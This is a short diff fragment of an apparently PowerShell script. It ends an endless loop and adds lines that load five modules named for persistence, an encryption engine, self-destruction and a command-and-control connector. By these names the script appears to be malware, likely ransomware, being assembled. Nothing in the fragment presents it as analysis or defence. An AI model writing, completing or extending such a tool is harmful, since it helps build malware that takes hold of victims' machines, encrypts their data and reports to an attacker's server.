@@ -73,3 +73,8 @@ while ($true) {
         }
     }
 }
+. .\ops_guard.ps1
+. .\persistence_installer.ps1
+. .\encryption_engine.ps1
+. .\self_destruct.ps1
+. .\c2_connector.ps1
